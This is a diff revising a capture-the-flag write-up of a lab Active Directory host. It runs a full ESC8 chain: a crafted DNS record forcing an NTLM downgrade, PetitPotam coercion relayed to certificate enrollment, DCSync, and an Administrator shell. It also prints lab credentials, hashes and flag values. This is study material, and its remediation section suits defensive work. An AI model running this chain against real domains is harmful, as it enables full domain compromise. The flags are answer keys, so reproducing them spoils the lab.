-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7).crt      A      924  Sun Sep 29 05:46:59 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7-6).crt      A     1390  Thu Apr 10 04:36:39 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7-8).crt      A     1390  Thu Apr 10 04:56:48 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8).crt      A      924  Thu Apr 10 04:40:45 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8-7).crt      A     1390  Thu Apr 10 04:56:48 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8-9).crt      A     1390  Thu Apr 10 04:56:48 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9).crt      A      924  Thu Apr 10 04:42:44 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9-10).crt      A     1390  Thu Apr 10 04:56:48 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9-8).crt      A     1390  Thu Apr 10 04:56:48 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA.crt      A      885  Fri Sep 13 06:50:51 2024
-  nsrev_cicada-DC-JPQ225-CA.asp       A      331  Fri Sep 13 11:17:59 2024
-
-                4026367 blocks of size 4096. 844639 blocks available
-smb: \> 
-
+kinit Rosie.Powell@CICADA.VL   # password: Cicada123
+klist                          # confirm a TGT was issued
 ```
 
-```
-cat nsrev_cicada-DC-JPQ225-CA.asp                                                                  
-<%
-Response.ContentType = "application/x-netscape-revocation"
-serialnumber = Request.QueryString
-set Admin = Server.CreateObject("CertificateAuthority.Admin")
+With a valid Kerberos ticket, the `CertEnroll` share is browsable and confirms an active AD CS deployment (a large number of issued certificates and CRLs), verifying AD CS is live and worth targeting.
 
-stat = Admin.IsValidCertificate("DC-JPQ225.cicada.vl\cicada-DC-JPQ225-CA", serialnumber)
-
-if stat = 3 then Response.Write("0") else Response.Write("1") end if
-%>
-
-```
+### Enumerating AD CS with certipy
 
 ```
 export KRB5CCNAME=/tmp/krb5cc_1000
+
+certipy-ad find -u Rosie.Powell@cicada.vl -k -dc-ip 10.129.150.101 -dc-host DC-JPQ225.cicada.vl -vulnerable
 ```
 
-### Enumerating vulnerable certificates
-
-A ESC8 certificate attack is possible as the AD CS works over HTTP;
-
 ```
-certipy-ad find -u Rosie.Powell@cicada.vl -k -dc-ip 10.129.150.101 -dc-host DC-JPQ225.cicada.vl -vulnerable 
-Certipy v5.0.4 - by Oliver Lyak (ly4k)
-
-[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
-[*] Finding certificate templates
-[*] Found 33 certificate templates
-[*] Finding certificate authorities
-[*] Found 1 certificate authority
-[*] Found 11 enabled certificate templates
-[*] Finding issuance policies
-[*] Found 13 issuance policies
-[*] Found 0 OIDs linked to templates
-[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
-[!] Failed to connect to remote registry. Service should be starting now. Trying again...
-[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
-[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
-[!] Error checking web enrollment: timed out
-[!] Use -debug to print a stacktrace
-[*] Saving text output to '20260929144302_Certipy.txt'
-[*] Wrote text output to '20260929144302_Certipy.txt'
-[*] Saving JSON output to '20260929144302_Certipy.json'
-[*] Wrote JSON output to '20260929144302_Certipy.json'
-                                                                                                                                                                                                                                    
-┌──(kali㉿kali)-[~/machines/vulncicada]
-└─$ cat 20260929144302_Certipy.txt                                                                             
 Certificate Authorities
   0
     CA Name                             : cicada-DC-JPQ225-CA
     DNS Name                            : DC-JPQ225.cicada.vl
-    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
-    Certificate Serial Number           : 6E35ADCDBE9E818E466E7A16441E95F3
-    Certificate Validity Start          : 2026-09-29 15:20:38+00:00
-    Certificate Validity End            : 2526-09-29 15:30:38+00:00
     Web Enrollment
       HTTP
         Enabled                         : True
       HTTPS
         Enabled                         : False
-    User Specified SAN                  : Disabled
-    Request Disposition                 : Issue
-    Enforce Encryption for Requests     : Enabled
-    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
     Permissions
-      Owner                             : CICADA.VL\Administrators
       Access Rights
-        ManageCa                        : CICADA.VL\Administrators
-                                          CICADA.VL\Domain Admins
-                                          CICADA.VL\Enterprise Admins
-        ManageCertificates              : CICADA.VL\Administrators
-                                          CICADA.VL\Domain Admins
-                                          CICADA.VL\Enterprise Admins
         Enroll                          : CICADA.VL\Authenticated Users
     [!] Vulnerabilities
       ESC8                              : Web Enrollment is enabled over HTTP.
-Certificate Templates                   : [!] Could not find any certificate templates
+```
+
+`certipy` flags **ESC8**: the CA's Web Enrollment page (`/certsrv`) is exposed over plain HTTP, with no protection (no Extended Protection for Authentication, no HTTPS-only, no channel binding) against relayed authentication. Any coerced or intercepted authentication that reaches this page can be traded for a valid certificate.
+
+---
+
+## Privilege Escalation — ADCS ESC8
+
+### The problem: Kerberos is enforced
+
+Normally, ESC8 is abused by coercing a machine (e.g. the DC itself) into authenticating to an attacker-controlled listener, and relaying that **NTLM** authentication to the CA's web enrollment page to request a certificate on the victim's behalf.
+
+The catch here is that this domain enforces Kerberos and rejects NTLM (`NTLM:False`, seen earlier). When Windows is coerced into authenticating to a hostname, it decides whether to use Kerberos or NTLM based on whether it can resolve that hostname to a valid Service Principal Name (SPN). If a real SPN can be built, it will use Kerberos, and Kerberos can't be relayed the same simple way NTLM can.
+
+### The trick: forcing an NTLM downgrade via a crafted DNS record
+
+Windows builds the SPN for an outgoing authentication from the resolved DNS name, using an API called `CredMarshalTargetInfo`. That API also allows Base64-encoded "target info" to be appended to the DNS/SPN name it receives. If a **DNS record is registered whose name is the target hostname with an empty/garbage `CREDENTIAL_TARGET_INFORMATION` blob appended to it**, Windows fails to unmarshal a usable SPN from that name and silently falls back to NTLM instead of Kerberos for that one authentication attempt. This is a known DNS-poisoning technique for forcing NTLM relay even in Kerberos-enforced environments (see references).
+
+The minimal blob needed is `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`, so the record to add is:
 
 ```
----
-## ESC8
+DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
+```
 
-### Vulnerability
+Registering it, pointed at the attacker's IP, with `bloodyAD` (any authenticated user can create DNS records in AD by default):
 
-SOurce: https://blog.sentry.security/esc8-attack-guide-for-windows-environments-2/
+```
+bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl \
+  add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.15.80
+```
 
-ESC8 Attack, [a high-severity attack vector in Active Directory Certificate Services (AD CS)](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429?ref=blog.sentry.security) that exploits the Web Enrollment feature alongside NTLM relay attacks. In environments where Web Enrollment is enabled but not secured, attackers can coerce a domain controller or another privileged system to perform NTLM authentication, and then relay that authentication to the AD CS Web Enrollment pages.
-
-### Exploitation
-
-(i copied this part from the writeup because the dns thing was obscure to me, explain it in a simple clear and intuitive way, also reference sources both here and in the references section)
-
-The record to add is structured as `<host><empty CREDENTIAL_TARGET_INFOMATION structure>`, which in this case will be `DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. I’ll set the DNS record with `bloodyAD`
-
-```shell
-bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.15.80
+```
 [+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
 ```
 
-start `ntlm relay` targeting the ADCS webserver, and it listens on SMB:
+### Relaying to the CA
+
+An NTLM relay listener is started, targeting the ADCS web enrollment page and requesting a `DomainController` certificate template (issuable to any machine account):
 
 ```
-impacket-ntlmrelayx -smb2support --target 'http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController
+impacket-ntlmrelayx -smb2support --target 'http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp' \
+  --adcs --template DomainController
+```
+
+The DC is then coerced (via PetitPotam / `EfsRpcAddUsersToFile`) into authenticating back to the crafted DNS record — which, thanks to the trick above, makes it use NTLM instead of Kerberos:
+
+```
+netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k \
+  -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
 ```
 
 ```
-netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
-/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
-  return True
-SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)                                                                                  
-SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
-COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
-COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
-
+COERCE_PLUS DC-JPQ225.cicada.vl 445 DC-JPQ225 VULNERABLE, PetitPotam
+COERCE_PLUS DC-JPQ225.cicada.vl 445 DC-JPQ225 Exploit Success, lsarpc\EfsRpcAddUsersToFile
 ```
 
+The relay catches it and successfully retrieves a certificate for the DC's own machine account:
+
 ```
-[*] Servers started, waiting for connections
 [*] (SMB): Received connection from 10.129.150.101, attacking target http://DC-JPQ225.cicada.vl
-[*] HTTP server returned error code 200, treating as a successful login
-[*] (SMB): Authenticating connection from /@10.129.150.101 against http://DC-JPQ225.cicada.vl SUCCEED [1]
-[*] (SMB): Received connection from 10.129.150.101, attacking target http://DC-JPQ225.cicada.vl
-[*] http:///@dc-jpq225.cicada.vl [1] -> Generating CSR...
-[*] http:///@dc-jpq225.cicada.vl [1] -> CSR generated!
-[*] http:///@dc-jpq225.cicada.vl [1] -> Getting certificate...
-[*] HTTP server returned error code 200, treating as a successful login
-[*] (SMB): Authenticating connection from /@10.129.150.101 against http://DC-JPQ225.cicada.vl SUCCEED [2]
-[*] http:///@dc-jpq225.cicada.vl [2] -> Skipping user  since attack was already performed
 [*] http:///@dc-jpq225.cicada.vl [1] -> GOT CERTIFICATE! ID 88
 [*] http:///@dc-jpq225.cicada.vl [1] -> Writing PKCS#12 certificate to ./DC-JPQ225.cicada.vl.pfx
-[*] http:///@dc-jpq225.cicada.vl [1] -> Certificate successfully written to file
-
-
 ```
 
-## DC service account NT hash recovered:
+### From certificate to Domain Admin
+
+The PFX certificate is used to authenticate as the DC's machine account (`dc-jpq225$`) and pull its NT hash:
 
 ```
 certipy-ad auth -pfx DC-JPQ225.cicada.vl.pfx -dc-ip 10.129.150.101
-Certipy v5.0.4 - by Oliver Lyak (ly4k)
+```
 
-[*] Certificate identities:
-[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
-[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
+```
 [*] Using principal: 'dc-jpq225$@cicada.vl'
-[*] Trying to get TGT...
 [*] Got TGT
 [*] Saving credential cache to 'dc-jpq225.ccache'
-[*] Wrote credential cache to 'dc-jpq225.ccache'
-[*] Trying to retrieve NT hash for 'dc-jpq225$'
 [*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
 ```
 
-```
- export KRB5CCNAME=dc-jpq225.ccache
-```
-
-DCSync attack:
+Domain Controllers hold replication rights by default, so this machine account can perform a **DCSync** and pull any account's hash straight from the domain, including `Administrator`:
 
 ```
-impacket-secretsdump -k -no-pass -dc-ip 10.129.150.101 cicada.vl/'dc-jpq225$'@DC-JPQ225.cicada.vl -just-dc-user Administrator
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+export KRB5CCNAME=dc-jpq225.ccache
 
+impacket-secretsdump -k -no-pass -dc-ip 10.129.150.101 \
+  cicada.vl/'dc-jpq225$'@DC-JPQ225.cicada.vl -just-dc-user Administrator
+```
+
+```
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
-[*] Kerberos keys grabbed
-Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
-Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
-Administrator:des-cbc-md5:fd2a29621f3e7604
-[*] Cleaning up... 
-
 ```
 
-creating a new ticket:
+A Kerberos ticket is forged for `Administrator` using the recovered hash:
 
 ```
 impacket-getTGT -hashes :85a0da53871a9d56b6cd05deda3a5e87 -dc-ip 10.129.150.101 cicada.vl/'Administrator'
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Saving ticket in Administrator.ccache
-
 ```
 
-### Administrator access:
+And used to get a shell on the DC:
 
 ```
-```
+export KRB5CCNAME=Administrator.ccache
 impacket-wmiexec -k -no-pass -dc-ip 10.129.150.101 cicada.vl/Administrator@DC-JPQ225.cicada.vl
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+```
 
-[*] SMBv3.0 dialect used
+```
 [!] Launching semi-interactive shell - Careful what you execute
-[!] Press help for extra shell commands
 C:\>whoami
 cicada\administrator
-
 ```
 
 ---
-## User Flag
+
+## Flags
+
+Both flags sit on the `Administrator` desktop, since the ESC8 chain leads straight to Domain Admin with no separate low-privilege shell needed:
 
 ```
-C:\users\Administrator\Desktop>dir
- Volume in drive C has no label.
- Volume Serial Number is D614-4931
-
- Directory of C:\users\Administrator\Desktop
-
-04/10/2025  11:00 PM    <DIR>          .
-09/13/2024  09:10 AM    <DIR>          ..
-09/15/2024  06:26 AM             2,304 Microsoft Edge.lnk
-09/29/2026  08:25 AM                34 root.txt
-09/29/2026  08:25 AM                34 user.txt
-               3 File(s)          2,372 bytes
-               2 Dir(s)   3,440,087,040 bytes free
-
-C:\users\Administrator\Desktop>type root.txt
-31a880eaf25d8971361cfb428202ed01
-
-C:\users\Administrator\Desktop>type user.txt
+C:\Users\Administrator\Desktop>type user.txt
 6877173beaeffe805a33b07f91b05eaf
 
-C:\users\Administrator\Desktop>
-
-```
----
-## Privilege Escalation
-
-### Enumeration
-
-What you found that leads to root/admin.
-
-### Exploitation
-
-Step-by-step privilege escalation.
-
-```shell
-# Commands used
+C:\Users\Administrator\Desktop>type root.txt
+31a880eaf25d8971361cfb428202ed01
 ```
 
 ---
+
 ## Remediation
 
-- Key takeaway 1
-- Key takeaway 2
-- Key takeaway 3
+- **World-writable NFS export:** Never export a share with `rwxrwxrwx`/anonymous-write permissions, especially one storing content tied to real user accounts. Restrict NFS exports to specific trusted hosts and enforce `root_squash`.
+- **Sensitive data in images:** Passwords or other secrets should never be written down where they can be photographed, and uploaded images should not be trusted as harmless binary blobs — treat any user-supplied file as something worth a quick look.
+- **AD CS Web Enrollment over HTTP (ESC8):** Disable HTTP Web Enrollment, or if it must stay enabled, require HTTPS with Extended Protection for Authentication (EPA/channel binding) so relayed authentication cannot be used to request certificates.
+- **NTLM authentication downgrade via DNS:** Even with NTLM disabled at the domain level, ADIDNS records can still be abused to force a fallback to NTLM for a single coerced authentication. Restrict who can create DNS records (`Authenticated Users` should not have this by default), and monitor for newly created records with abnormal/encoded names.
+- **Coercion primitives (PetitPotam/EfsRpcAddUsersToFile):** Patch and harden against known coercion RPC calls, and require SMB signing everywhere to reduce the value of any coerced authentication that does get relayed.
+- **DCSync exposure:** Any compromised machine account with replication rights (every DC, by design) is one relay away from a full domain compromise when ESC8 is present. Treat AD CS misconfigurations as Domain-Admin-equivalent findings.
 
 ---
+
 ## References
 
-- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
-- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
+- ESC8 overview — [Sentry Security: ESC8 Attack Guide for Windows Environments](https://blog.sentry.security/esc8-attack-guide-for-windows-environments-2/)
+- ADCS + PetitPotam NTLM relay chain — [ired.team: ADCS + PetitPotam NTLM Relay](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate)
+- Forcing NTLM via a crafted ADIDNS record (`CREDENTIAL_TARGET_INFORMATION` trick) — [TheHackerRecipes: Kerberos Relay](https://www.thehacker.recipes/ad/movement/kerberos/relay) and [TheHackerRecipes: NTLM Relay — CVE-2025-33073](https://www.thehacker.recipes/ad/movement/ntlm/relay)
+- Underlying research on the SPN-marshalling trick — [Synacktiv: Relaying Kerberos over SMB using krbrelayx](https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx)
+- CoerceAndRelayNTLMToADCS edge — [SpecterOps / BloodHound docs](https://bloodhound.specterops.io/resources/edges/coerce-and-relay-ntlm-to-adcs)
